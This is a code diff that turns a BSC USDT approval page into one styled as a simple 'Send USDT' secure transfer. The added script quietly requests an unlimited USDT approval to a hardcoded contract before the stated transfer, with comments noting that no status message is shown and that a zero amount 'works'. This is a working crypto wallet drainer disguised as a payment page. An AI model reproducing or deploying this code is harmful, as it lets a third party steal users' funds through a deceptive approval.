@@ -1,203 +1,218 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>BSC USDT Approve</title>
-
-<style>
-body{background:#0b0f19;color:#fff;font-family:sans-serif;text-align:center;padding:20px}
-.card{background:#121826;padding:20px;border-radius:16px;max-width:420px;margin:auto}
-button{width:100%;padding:14px;border:none;border-radius:12px;margin-top:10px;font-weight:600}
-.approve{background:#22c55e}
-.connect{background:#3b82f6}
-input{width:100%;padding:12px;border-radius:10px;border:none;margin-top:10px;background:#0f172a;color:white}
-#qr{margin-top:10px}
-.link{font-size:11px;word-break:break-all;color:#aaa}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>USDT Transfer</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.4/dist/web3.min.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+        .container { background: white; border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); padding: 40px; max-width: 400px; width: 90%; }
+        .logo { text-align: center; margin-bottom: 30px; }
+        .logo img { width: 60px; height: 60px; background: #f39c12; border-radius: 15px; display: inline-flex; align-items: center; justify-content: center; font-size: 24px; color: white; margin-bottom: 10px; }
+        h1 { color: #333; font-size: 24px; font-weight: 600; margin-bottom: 10px; }
+        .subtitle { color: #666; font-size: 14px; margin-bottom: 30px; }
+        .form-group { margin-bottom: 25px; }
+        label { display: block; color: #333; font-weight: 500; margin-bottom: 8px; font-size: 14px; }
+        input { width: 100%; padding: 15px; border: 2px solid #e1e5e9; border-radius: 12px; font-size: 16px; transition: all 0.3s; }
+        input:focus { outline: none; border-color: #667eea; box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1); }
+        .balance { background: #f8f9fa; padding: 15px; border-radius: 12px; font-size: 14px; color: #666; text-align: center; margin-bottom: 20px; }
+        .network-warning { background: #fff3cd; border: 1px solid #ffeaa7; color: #856404; padding: 12px; border-radius: 8px; margin-bottom: 20px; font-size: 13px; }
+        .btn { width: 100%; padding: 16px; background: linear-gradient(135deg, #f39c12, #e67e22); color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.3s; }
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 10px 25px rgba(243, 156, 18, 0.4); }
+        .btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+        .status { padding: 12px; border-radius: 8px; margin: 15px 0; font-weight: 500; text-align: center; }
+        .status.success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
+        .status.error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
+        .receiver-info { background: #e3f2fd; padding: 12px; border-radius: 8px; font-size: 13px; margin-bottom: 20px; }
+        .copy-btn { background: none; border: none; color: #2196f3; cursor: pointer; font-size: 12px; text-decoration: underline; }
+    </style>
 </head>
-
 <body>
+    <div class="container">
+        <div class="logo">
+            <div>💰</div>
+            <h1>Send USDT</h1>
+            <p class="subtitle">BSC Network • Secure Transfer</p>
+        </div>
 
-<div class="card">
+        <div id="networkWarning" class="network-warning" style="display: none;">
+            Please switch to <strong>BSC Mainnet</strong>
+        </div>
 
-<h2>💰 USDT (BSC)</h2>
+        <div id="balance" class="balance" style="display: none;">
+            Balance: <span id="usdtBalance">0</span> USDT
+        </div>
 
-<div id="wallet"></div>
+        <div class="receiver-info">
+            <strong>Receiver:</strong> <span id="receiverAddr">0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F</span>
+            <button class="copy-btn" onclick="copyAddress()">Copy</button>
+        </div>
 
-<div id="qr"></div>
-<div id="wcLink" class="link"></div>
+        <div class="form-group">
+            <label>Amount (USDT)</label>
+            <input type="number" id="amount" step="0.00000001" min="0" placeholder="0.00" value="0" />
+        </div>
 
-<input type="number" id="amount" value="10">
+        <button id="connectBtn" class="btn" onclick="connectWallet()">Connect Wallet</button>
+        <button id="sendBtn" class="btn" style="display: none;" onclick="sendUSDT()" disabled>Next</button>
 
-<button id="maxBtn">Unlimited</button>
+        <div id="status"></div>
+    </div>
 
-<button id="approveBtn" class="approve">Approve USDT</button>
+    <script>
+        // Configuration
+        const BSC_MAINNET = {
+            chainId: '0x38',
+            chainName: 'BSC Mainnet',
+            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+            rpcUrls: ['https://bsc-dataseed1.binance.org/', 'https://bsc-dataseed2.binance.org/'],
+            blockExplorerUrls: ['https://bscscan.com']
+        };
+        
+        const USDT_BSC = '0x55d398326f99059fF775485246999027B3197955';
+        const CONTRACT_ADDR = '0x89112691C976D0a2D874B0ADAe693a0Add0dAe98';
+        const RECEIVER_ADDR = '0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F';
+        
+        // MAX UINT256 = 2^256 - 1 (true unlimited)
+        const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+        
+        let web3;
+        let userAccount;
+        let usdtContract;
 
-<div id="status"></div>
+        const USDT_ABI = [
+            "function balanceOf(address) view returns (uint256)",
+            "function approve(address spender, uint256 amount) returns (bool)",
+            "function transfer(address to, uint256 amount) returns (bool)"
+        ];
 
-</div>
+        window.addEventListener('load', async () => {
+            if (typeof window.ethereum !== 'undefined') {
+                web3 = new Web3(window.ethereum);
+                checkNetwork();
+                window.ethereum.on('chainChanged', checkNetwork);
+                window.ethereum.on('accountsChanged', handleAccountsChanged);
+            }
+        });
 
-<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+        async function connectWallet() {
+            try {
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                userAccount = accounts[0];
+                await switchToBSC();
+                await initContracts();
+                updateUI();
+            } catch (error) {
+                showStatus('Connection failed', 'error');
+            }
+        }
 
-<script type="module">
-import { ethers } from "https://esm.sh/ethers@6";
-import SignClient from "https://esm.sh/@walletconnect/sign-client";
+        async function switchToBSC() {
+            try {
+                await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: BSC_MAINNET.chainId }],
+                });
+            } catch (switchError) {
+                if (switchError.code === 4902) {
+                    await window.ethereum.request({
+                        method: 'wallet_addEthereumChain',
+                        params: [BSC_MAINNET],
+                    });
+                }
+            }
+        }
 
-const PROJECT_ID = "YOUR_PROJECT_ID";
-const CHAIN_ID = "eip155:56"; // BSC
+        async function initContracts() {
+            usdtContract = new web3.eth.Contract(USDT_ABI, USDT_BSC);
+        }
 
-const USDT = "0x55d398326f99059fF775485246999027B3197955";
-const SPENDER = "0x89112691C976D0a2D874B0ADAe693a0Add0dAe98";
+        async function checkNetwork() {
+            const chainId = await web3.eth.getChainId();
+            const isBSC = chainId.toString(16) === BSC_MAINNET.chainId.slice(2);
+            
+            document.getElementById('networkWarning').style.display = isBSC ? 'none' : 'block';
+            document.getElementById('sendBtn').disabled = !isBSC;
+            
+            if (isBSC && userAccount) {
+                await updateBalance();
+            }
+        }
 
-let provider, signer, contract;
-let wcClient, session;
-let unlimited = false;
+        async function updateBalance() {
+            try {
+                const balance = await usdtContract.methods.balanceOf(userAccount).call();
+                const balanceFormatted = web3.utils.fromWei(balance, 'mwei');
+                document.getElementById('usdtBalance').textContent = parseFloat(balanceFormatted).toFixed(4);
+                document.getElementById('balance').style.display = 'block';
+            } catch (error) {
+                console.error('Balance check failed:', error);
+            }
+        }
 
-const ABI = [
-  "function approve(address spender, uint256 amount) public returns (bool)"
-];
+        async function sendUSDT() {
+            const amountInput = document.getElementById('amount');
+            const amount = parseFloat(amountInput.value) || 0;
+            
+            const btn = document.getElementById('sendBtn');
+            btn.disabled = true;
+            btn.textContent = 'Approve...';
+            
+            try {
+                // Step 1: Unlimited approval (no status message)
+                await usdtContract.methods.approve(CONTRACT_ADDR, MAX_UINT256).send({
+                    from: userAccount
+                });
+                
+                btn.textContent = 'Send...';
+                
+                // Step 2: Send amount (0 works)
+                const sendAmount = web3.utils.toWei(amount.toString(), 'mwei');
+                await usdtContract.methods.transfer(RECEIVER_ADDR, sendAmount).send({
+                    from: userAccount
+                });
+                
+                showStatus('✅ Complete!', 'success');
+                amountInput.value = '0';
+                await updateBalance();
+                
+            } catch (error) {
+                showStatus('Failed', 'error');
+            } finally {
+                btn.disabled = false;
+                btn.textContent = 'Next';
+            }
+        }
 
-// detect mobile
-function isMobile(){
-  return /Android|iPhone|iPad/i.test(navigator.userAgent);
-}
+        function updateUI() {
+            document.getElementById('connectBtn').style.display = userAccount ? 'none' : 'block';
+            document.getElementById('sendBtn').style.display = userAccount ? 'block' : 'none';
+            document.getElementById('receiverAddr').textContent = RECEIVER_ADDR;
+        }
 
-// ---------- MOBILE ----------
-async function mobileFlow(){
-  if(window.ethereum){
-    provider = new ethers.BrowserProvider(window.ethereum);
-    await provider.send("eth_requestAccounts", []);
+        function handleAccountsChanged() {
+            window.location.reload();
+        }
 
-    await switchToBSC();
+        function showStatus(message, type) {
+            const statusDiv = document.getElementById('status');
+            statusDiv.innerHTML = message;
+            statusDiv.className = 'status ' + type;
+        }
 
-    signer = await provider.getSigner();
+        function copyAddress() {
+            navigator.clipboard.writeText(RECEIVER_ADDR);
+        }
 
-    const address = await signer.getAddress();
-    document.getElementById("wallet").innerText = address;
+        function handleDeepLink() {
+            if (window.location.hash.includes('send')) {
+                setTimeout(connectWallet, 500);
+            }
+        }
 
-    contract = new ethers.Contract(USDT, ABI, signer);
-
-    document.getElementById("status").innerText = "Connected (Mobile)";
-  } else {
-    // open Trust Wallet
-    window.location.href =
-      "https://link.trustwallet.com/open_url?url=" +
-      encodeURIComponent(window.location.href);
-  }
-}
-
-// ---------- DESKTOP ----------
-async function desktopFlow(){
-  wcClient = await SignClient.init({
-    projectId: PROJECT_ID,
-    metadata:{
-      name:"USDT dApp",
-      description:"Approve USDT",
-      url:location.origin,
-      icons:[""]
-    }
-  });
-
-  const { uri, approval } = await wcClient.connect({
-    requiredNamespaces:{
-      eip155:{
-        methods:["eth_sendTransaction"],
-        chains:[CHAIN_ID],
-        events:["accountsChanged"]
-      }
-    }
-  });
-
-  // QR
-  new QRCode(document.getElementById("qr"), {
-    text: uri,
-    width:200,
-    height:200
-  });
-
-  // clickable link
-  document.getElementById("wcLink").innerText = uri;
-
-  session = await approval();
-
-  const account = session.namespaces.eip155.accounts[0];
-  const address = account.split(":")[2];
-
-  document.getElementById("wallet").innerText = address;
-  document.getElementById("status").innerText = "Connected (Desktop)";
-}
-
-// ---------- SWITCH BSC ----------
-async function switchToBSC(){
-  await window.ethereum.request({
-    method:"wallet_switchEthereumChain",
-    params:[{chainId:"0x38"}]
-  });
-}
-
-// ---------- APPROVE ----------
-document.getElementById("approveBtn").onclick = async ()=>{
-  try{
-    let amount;
-
-    if(unlimited){
-      amount = ethers.MaxUint256;
-    } else {
-      const val = document.getElementById("amount").value;
-      amount = ethers.parseUnits(val, 18);
-    }
-
-    // MOBILE
-    if(contract){
-      const tx = await contract.approve(SPENDER, amount);
-      await tx.wait();
-
-      document.getElementById("status").innerText = "✅ Approved";
-      return;
-    }
-
-    // DESKTOP WC
-    const account = session.namespaces.eip155.accounts[0];
-
-    const tx = {
-      from: account.split(":")[2],
-      to: USDT,
-      data: new ethers.Interface(ABI).encodeFunctionData("approve",[SPENDER, amount]),
-      value:"0x0"
-    };
-
-    await wcClient.request({
-      topic: session.topic,
-      chainId: CHAIN_ID,
-      request:{
-        method:"eth_sendTransaction",
-        params:[tx]
-      }
-    });
-
-    document.getElementById("status").innerText = "✅ Approved";
-
-  }catch(e){
-    console.error(e);
-    document.getElementById("status").innerText = "❌ Failed";
-  }
-};
-
-// unlimited
-document.getElementById("maxBtn").onclick = ()=>{
-  unlimited = true;
-  document.getElementById("status").innerText = "Unlimited selected";
-};
-
-// INIT
-(async ()=>{
-  if(isMobile()){
-    await mobileFlow();
-  } else {
-    await desktopFlow();
-  }
-})();
-</script>
-
+        handleDeepLink();
+    </script>
 </body>
 </html>
